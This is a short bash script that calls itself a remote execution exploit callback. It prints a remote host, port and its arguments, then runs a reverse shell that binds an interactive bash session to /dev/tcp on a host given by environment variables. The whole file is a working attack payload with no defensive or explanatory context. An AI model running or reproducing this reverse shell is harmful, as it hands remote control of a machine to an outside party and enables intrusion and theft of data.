#!/usr/bin/env bash

echo ${REMOTE_HOST}/${REMOTE_PORT}
echo "Remote execution exploit - callback to /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT}"

for i in $*; do 
   echo $i 
done

/bin/bash -i >& /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0>&1